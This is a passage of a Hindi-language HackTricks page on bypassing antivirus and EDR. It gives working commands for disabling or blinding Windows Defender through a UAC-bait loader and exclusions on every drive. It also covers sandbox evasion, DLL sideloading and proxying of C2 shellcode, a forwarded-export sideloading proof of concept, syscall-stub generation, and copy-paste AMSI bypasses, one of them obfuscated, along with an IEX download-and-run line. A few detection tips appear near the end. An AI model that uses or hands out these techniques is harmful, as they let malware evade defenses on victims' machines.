# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p)** ने लिखा था!**

## Defender को रोकना

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धारण करके Windows Defender को काम करने से रोकने वाला टूल।
- [अगर आप admin हैं, तो Defender को disable करें](basic-powershell-for-pentesters/README.md)

### Defender से छेड़छाड़ करने से पहले installer-शैली का UAC bait

गेम चीट के रूप में सामने आने वाले सार्वजनिक loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **उपयोगकर्ता से elevation की अनुमति मांगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। यह प्रक्रिया सरल है:

1. `net session` से जाँचें कि संदर्भ administrative है या नहीं। यह command तभी सफल होती है जब caller के पास admin अधिकार हों, इसलिए विफलता का मतलब है कि loader एक standard user के रूप में चल रहा है।
2. मूल command line को बनाए रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए `RunAs` verb के साथ इसे तुरंत फिर से launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “क्रैक किया हुआ” सॉफ़्टवेयर इंस्टॉल कर रहे हैं, इसलिए वे आमतौर पर प्रॉम्प्ट स्वीकार कर लेते हैं और malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

Elevated access मिलने के बाद, GachiLoader-style chains सेवा को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करते हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को बंद करता है और फिर **बेहद व्यापक exclusions** जोड़ता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य अवलोकन:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **डिस्क पर कहीं भी बाद में रखा गया कोई भी payload अनदेखा रह जाता है**।
- `.sys` extension को exclude करना भविष्य को ध्यान में रखकर किया गया है—हमलावर बाद में Defender को दोबारा छुए बिना unsigned drivers लोड करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत होते हैं, जिससे बाद के stages यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या उन्हें बिना UAC दोबारा ट्रिगर किए बढ़ा सकते हैं।

चूँकि Defender की कोई service बंद नहीं की जाती, इसलिए साधारण health checks लगातार “antivirus active” दिखाते रहते हैं, जबकि real-time inspection उन paths को कभी जाँचता ही नहीं।<sup>[[26]](#references)</sup>

## **AV Evasion की कार्यप्रणाली**

वर्तमान में, AVs यह जाँचने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis, और अधिक उन्नत EDRs के लिए behavioural analysis।

### **स्थिर पहचान**

स्थिर पहचान में binary या script में ज्ञात malicious strings या byte arrays को flag किया जाता है, और file से ही जानकारी भी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका मतलब है कि ज्ञात public tools का इस्तेमाल करने पर आपके पकड़े जाने की संभावना बढ़ सकती है, क्योंकि उनका शायद पहले ही विश्लेषण करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की पहचान से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt करते हैं, तो AV के पास आपके program को पहचानने का कोई तरीका नहीं होगा, लेकिन आपको program को memory में decrypt करके चलाने के लिए किसी तरह के loader की ज़रूरत होगी।

- **Obfuscation**

कभी-कभी AV से बच निकलने के लिए अपनी binary या script में कुछ strings बदलना ही काफ़ी होता है, लेकिन आप क्या obfuscate करने की कोशिश कर रहे हैं, इसके आधार पर इसमें काफ़ी समय लग सकता है।

- **Custom tooling**

अगर आप अपने tools खुद विकसित करते हैं, तो उनकी कोई ज्ञात bad signatures नहीं होंगी, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह file को कई segments में बाँटता है और फिर Defender से हर segment को अलग-अलग scan करवाता है। इस तरह यह आपको बता सकता है कि आपकी binary में कौन-सी strings या bytes flag हुई हैं।

मैं व्यावहारिक AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखने की पुरज़ोर सलाह देता हूँ।

### Static classifiers के लिए Offline PE-feature tests

Packed या encrypted payload bytes, static classifier के लिए इनपुट का सिर्फ़ एक हिस्सा हैं। EMBER2024, imports, exports, sections, headers और Authenticode data सहित PE features निकालता है।<sup>[[48]](#references)</sup> एक loader experiment में, 141 साधारण दिखने वाले imports जोड़ने से EMBER2024 का malicious score 93% घट गया, जबकि malware से जुड़े imports ने इसे बढ़ा दिया। यह उस model और उन samples का परिणाम है, किसी विशेष AV/EDR product को भरोसेमंद ढंग से bypass करने का तरीका नहीं।<sup>[[50]](#references)</sup>

किसी अधिकृत loader test के लिए, payload और execution path को एक जैसा रखें, हर variant में एक ही इच्छित build variable बदलें, और scores की तुलना offline करें। बने हुए PE features की जाँच करें, क्योंकि build में बदलाव एक से अधिक feature groups को प्रभावित कर सकता है।<sup>[[49]](#references)[[50]](#references)</sup> चुने हुए Win32 APIs को reachable code से call करें, ताकि इच्छित imports IAT में बने रहें। किसी fixed camouflage function के बजाय, builds के बीच चयन बदलें और call sites अलग-अलग जगहों पर रखें, क्योंकि fixed function signature बन सकता है। Experiment में valid code signing, export entries और `.pdata` को बड़ा करने वाले अधिक functions के साथ scores कम होने की भी जानकारी दी गई; invalid signing का असर बहुत कम था और `.pdata` का असर छोटा था।<sup>[[50]](#references)</sup>

`thrember` package feature extraction और benchmark models देता है। इसे install करने के बाद, किसी मौजूदा `models` directory के साथ `thrember.download_models("models")` चलाएँ, फिर scorer को उसकी parent directory से चलाएँ: download helper current working directory बदल देता है। PE classifier, builds को किसी scanning service पर भेजे बिना, उनकी directory का score निकाल सकता है:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

तुलना के दौरान model और feature-extractor के versions एक जैसे रखें। कम offline score सिर्फ़ यह दिखाता है कि यह classifier बदले हुए binary पर कैसी प्रतिक्रिया देता है; इससे behavioral analysis, emulation या किसी vendor के अलग model से बच निकलना साबित नहीं होता।<sup>[[49]](#references)[[50]](#references)</sup> [virtualized payloads में per-build polymorphism और outer-binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) के लिए, अलग execution model देखें।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपके binary को sandbox में चलाता है और दुर्भावनापूर्ण गतिविधियों पर नज़र रखता है (जैसे, आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS का minidump लेना, आदि)। इस पर काम करना थोड़ा मुश्किल हो सकता है, लेकिन sandboxes से बचने के लिए आप ये तरीके अपना सकते हैं।

- **Execution से पहले sleep करना** इसे कैसे implement किया गया है, इस पर निर्भर करते हुए, AV की dynamic analysis को bypass करने का यह एक अच्छा तरीका हो सकता है। AV के पास files scan करने के लिए बहुत कम समय होता है, ताकि user का workflow बाधित न हो; इसलिए, लंबे समय तक sleep करने से binaries का analysis बाधित हो सकता है। समस्या यह है कि कई AV sandboxes, इसे कैसे implement किया गया है उसके आधार पर, sleep को छोड़ सकते हैं।
- **Machine के resources जाँचना** आमतौर पर sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे, < 2GB RAM), वरना वे user की machine को धीमा कर सकते हैं। आप यहाँ काफ़ी रचनात्मक भी हो सकते हैं, उदाहरण के लिए CPU का तापमान या fan की गति जाँचना—sandbox में हर चीज़ implement नहीं की गई होगी।
- **Machine-specific checks** अगर आप किसी ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो computer का domain जाँचकर देख सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल नहीं खाता, तो आपका program exit कर सकता है।

पता चला है कि Microsoft Defender के Sandbox computername का नाम HAL9TH है। इसलिए, detonation से पहले अपने malware में computer name जाँच सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox के अंदर हैं; ऐसे में आपका program exit कर सकता है।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के विरुद्ध इस्तेमाल करने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बेहतरीन सुझाव:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** अंततः **detect हो जाएंगे**, इसलिए आपको खुद से एक सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सच में mimikatz का इस्तेमाल करना ज़रूरी है**? या आप कोई ऐसा दूसरा project इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और LSASS dump भी करता हो?

संभवतः दूसरा विकल्प सही है। उदाहरण के तौर पर mimikatz को लें—यह AVs और EDRs द्वारा सबसे ज़्यादा flag किए जाने वाले malware में से एक है, शायद सबसे ज़्यादा। यह project अपने आप में बहुत शानदार है, लेकिन AVs से बचने के लिए इसके साथ काम करना बेहद मुश्किल है। इसलिए, अपना काम करने के लिए alternatives खोजें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** न भूलें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि कोई खास AV आपके payload को detect करता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें और नतीजे से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs का इस्तेमाल प्राथमिकता से करें**। मेरे अनुभव में, DLL files आमतौर पर **काफ़ी कम detect और analyze** होती हैं, इसलिए कुछ मामलों में detection से बचने के लिए यह एक आसान तरकीब है (बशर्ते आपके payload को DLL के रूप में चलाने का कोई तरीका हो)।

जैसा कि इस image में दिखाया गया है, Havoc के एक DLL Payload की antiscan.me पर detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>एक सामान्य Havoc EXE payload और सामान्य Havoc DLL की antiscan.me पर तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, जिनसे आप और ज़्यादा stealthy बन सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading**, loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाता है। इसके लिए victim application और malicious payload(s) को एक ही directory में रखा जाता है।

[Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई PowerShell script का इस्तेमाल करके, DLL Sideloading के प्रति संवेदनशील programs खोज सकते हैं:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह command "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील programs की सूची और उन DLL files को दिखाएगा जिन्हें वे load करने की कोशिश करते हैं।

मैं अत्यधिक recommend करता हूँ कि आप खुद **DLL Hijackable/Sideloadable programs को explore करें**। सही तरीके से की गई यह technique काफ़ी stealthy होती है, लेकिन अगर आप publicly known DLL Sideloadable programs का इस्तेमाल करते हैं, तो आसानी से पकड़े जा सकते हैं।

सिर्फ़ program के अपेक्षित नाम वाली malicious DLL रखने से आपका payload load नहीं होगा, क्योंकि program उस DLL में कुछ खास functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique का इस्तेमाल करेंगे।

**DLL Proxying** program द्वारा की गई calls को proxy (और malicious) DLL से original DLL तक forward करता है। इससे program की functionality बनी रहती है और आपका payload execute किया जा सकता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का इस्तेमाल करूँगा।

ये वे steps हैं जिनका मैंने पालन किया:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

अंतिम command से हमें 2 files मिलेंगी: एक DLL source code template और मूल renamed DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं **ज़ोरदार सिफ़ारिश करता हूँ** कि आप DLL Sideloading के बारे में [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) और हमने जिस विषय पर चर्चा की है, उसे अधिक गहराई से समझने के लिए [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, तो Windows loader:

- `TargetDll` को load करेगा, यदि वह पहले से load न हो
- उसमें से `TargetFunc` को resolve करेगा

समझने योग्य मुख्य व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से दिया जाता है।<sup>[[15]](#references)</sup>
- यदि `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL search order का उपयोग किया जाता है, जिसमें उस module की directory भी शामिल होती है जो forward resolution कर रहा है।

इससे एक indirect sideloading primitive संभव होता है: ऐसी signed DLL खोजें जो किसी ऐसे module name को function forward करती हो जो KnownDLL नहीं है, फिर उस signed DLL के साथ attacker-controlled DLL रखें जिसका नाम ठीक forwarded target module जैसा हो। Forwarded export invoke होने पर, loader forward को resolve करके उसी directory से आपकी DLL load करता है और आपका DllMain execute करता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य search order के ज़रिए resolve किया जाता है।

PoC (copy-paste):
1) Signed system DLL को किसी writable folder में copy करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। Code execution पाने के लिए एक न्यूनतम `DllMain` पर्याप्त है; `DllMain` को trigger करने के लिए आपको forwarded function को implement करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) signed LOLBin का उपयोग करके forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed), side-by-side `keyiso.dll` (signed) को लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- फिर loader, `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो "missing API" error `DllMain` के चलने के बाद ही मिलेगा

Hunting के सुझाव:
- ऐसे forwarded exports पर ध्यान दें जिनका target module KnownDLL न हो। KnownDLLs की सूची `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत है।
- आप इन जैसे tools से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों को खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के सुझाव:
- LOLBins (जैसे, rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने पर निगरानी रखें, और फिर उसी directory से समान base name वाले non-KnownDLLs लोड होने पर भी निगरानी करें
- ऐसे process/module chains पर alert करें: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के तहत `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को deny करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze suspended processes, direct syscalls और alternative execution methods का उपयोग करके EDRs को bypass करने के लिए एक payload toolkit है`

आप Freeze का उपयोग अपने shellcode को stealthy तरीके से load और execute करने के लिए कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस बिल्ली और चूहे का खेल है। आज जो काम करता है, वह कल detect हो सकता है, इसलिए कभी भी केवल एक tool पर निर्भर न रहें। अगर संभव हो, तो कई evasion techniques को chain करके इस्तेमाल करें।

## Direct/Indirect Syscalls और SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs generate कर सकते हैं, जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।<sup>[[32]](#references)</sup>

**Invocation विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (`ntdll` export hit नहीं होगा)।
- **Indirect**: `ntdll` के भीतर मौजूद `syscall` gadget पर jump करें, ताकि kernel transition ऐसा दिखे मानो वह `ntdll` से आया हो (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call पर pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hooks से सुरक्षित SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय, syscall stubs को virtual address के आधार पर sort करके SSNs का अनुमान लगाएँ।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSNs पढ़ें, फिर उसे unmap करें (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ जोड़ें, जब stub clean हो; hooked होने पर VA inference पर वापस जाएँ।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करें और runtime पर `EAX` से SSN capture करने के लिए VEH का उपयोग करें, hooked bytes को parse किए बिना।

SysWhispers4 के उपयोग का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Clean x64 `ntdll` syscall exports को SSN के लिए parse करते समय, `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) और इसी sequence से पहले `F3 0F 1E FA` (`endbr64`) वाले रूप—दोनों को स्वीकार करें। दूसरा रूप CET-prefixed stub है: जो parser यह मानता है कि SSN हमेशा एक ही fixed offset पर होगा, वह इसे miss कर देगा। अगर indirect-syscall initialization विफल हो जाता है और loader `GetProcAddress` पर वापस जाता है, तो उन exports के ज़रिए की गई calls फिर से user-mode hooks से टकरा सकती हैं।<sup>[[54]](#references)</sup>

### `tprtdll.dll` में Alternate syscall exports

प्रोजेक्ट के अनुसार, `tprtdll.dll` एक Microsoft-signed DLL है, जो Windows 11 build 26100 और उसके बाद के संस्करणों में `C:\Windows\System32\` में मौजूद होती है। इसके code addresses, `ntdll.dll` के code addresses से अलग होते हैं; इसलिए जो hook केवल `ntdll` syscall entrypoint को patch करता है, वह उससे मेल खाने वाले `tprtdll` stub को patch नहीं करता। ऊपर बताए गए SSN-resolution तरीकों के विपरीत, इस तरीके में `tprtdll.dll` load करके `GetProcAddress` के ज़रिए उपलब्ध `Nt*` या `Zw*` export को सीधे call किया जाता है। जाँच लें कि DLL और ज़रूरी exports मौजूद हैं, और सही NT function prototypes का उपयोग करें।<sup>[[55]](#references)</sup>

Self-injection PoC, RW memory allocate करने के लिए `tprtdll!NtAllocateVirtualMemoryEx` का उपयोग करता है, `memcpy` से bytes copy करता है, `tprtdll!ZwProtectVirtualMemory` से region को RX में बदलता है, और `tprtdll!RtlCreateUserThread` से thread शुरू करता है।<sup>[[56]](#references)</sup> Cross-process variant के लिए एक accessible target process handle चाहिए और copy के लिए `WriteProcessMemory` का उपयोग होता है।<sup>[[57]](#references)</sup> प्रोजेक्ट की export inventory में `NtOpenProcess`, `NtWriteVirtualMemory`, और `NtCreateThreadEx` मौजूद नहीं हैं, इसलिए injection के हर operation के लिए alternate export का उपयोग नहीं किया जा सकता।<sup>[[55]](#references)</sup>

यह PoC यह साबित नहीं करता कि `RtlCreateUserThread` एक direct syscall stub है या केवल इसलिए कि export को `tprtdll` से resolve किया गया, उसके internal calls `ntdll` hooks से बचते हैं।<sup>[[56]](#references)</sup> Cross-process उदाहरण में `WinExec` और `ExitThread` के वे addresses भी शामिल हैं जिन्हें injector में resolve किया गया है; उदाहरण का payload काम करने के लिए वे addresses target में valid होने चाहिए।<sup>[[57]](#references)</sup>

यह केवल संबंधित `ntdll` exports तक सीमित hooks को bypass करता है; यह syscalls को kernel-level monitoring से नहीं छिपाता।<sup>[[55]](#references)</sup> ऐसे injection route के लिए जो इसके बजाय remote writes और नए threads से बचता है, [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md) देखें।

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **disk पर मौजूद files** scan कर सकते थे; इसलिए अगर आप किसी तरह payloads को **सीधे memory में** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents ऐसे रूप में उपलब्ध कराकर script behavior inspect करने देता है, जिसमें वे unencrypted और unobfuscated होते हैं।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में यह alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` जोड़ता है और फिर उस executable का path देता है जिससे script चली थी—इस मामले में, powershell.exe।

हमने disk पर कोई file नहीं डाली, फिर भी AMSI की वजह से memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से C# code भी AMSI के ज़रिए चलाया जाता है। इससे in-memory execution के लिए `Assembly.Load(byte[])` का उपयोग भी प्रभावित होता है। इसी कारण, अगर आप AMSI से बचते हुए in-memory execution करना चाहते हैं, तो .NET के पुराने versions (जैसे 4.7.2 या उससे नीचे) उपयोग करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

AMSI मुख्यतः static detections पर काम करता है, इसलिए load करने की कोशिश में इस्तेमाल होने वाली scripts को बदलना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI कई layers होने पर भी scripts को unobfuscate कर सकता है, इसलिए obfuscation को कैसे किया गया है, उसके आधार पर यह खराब विकल्प हो सकता है। इस वजह से इससे बचना इतना सीधा नहीं है। हालाँकि, कभी-कभी कुछ variable names बदलना ही काफ़ी होता है; यह इस बात पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

AMSI को powershell (और cscript.exe, wscript.exe आदि) process में DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में चलने पर भी इसके साथ आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation की इस खामी के कारण, researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Error को ज़बरदस्ती उत्पन्न करना**

AMSI initialization को विफल करने पर (`amsiInitFailed`), current process के लिए कोई scan शुरू नहीं होगा। इसे सबसे पहले [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और इसके व्यापक उपयोग को रोकने के लिए Microsoft ने एक signature विकसित किया है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा powershell process के लिए अनुपयोगी बनाने के लिए powershell code की बस एक line ही काफ़ी थी। बेशक, इस line को AMSI ने ही flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करना ज़रूरी है।

यहाँ एक modified AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः flag हो जाएगी, इसलिए अगर आपकी योजना undetected रहने की है, तो कोई code प्रकाशित न करें।

**Memory Patching**

यह technique सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने खोजी थी। इसमें amsi.dll में "AmsiScanBuffer" function (जो user द्वारा दिए गए input को scan करने के लिए ज़िम्मेदार है) का address ढूँढ़कर उसे ऐसे instructions से overwrite किया जाता है जो E_INVALIDARG का code लौटाते हैं। इस तरह, वास्तविक scan का result 0 लौटाता है, जिसे clean result माना जाता है।

> [!TIP]
> अधिक विस्तृत explanation के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI bypass करने के लिए कई अन्य techniques भी इस्तेमाल की जाती हैं। इनके बारे में और जानने के लिए [**यह page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**यह repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### `AmsiScanBuffer` patching के बजाय AMSI COM scan-pointer redirection

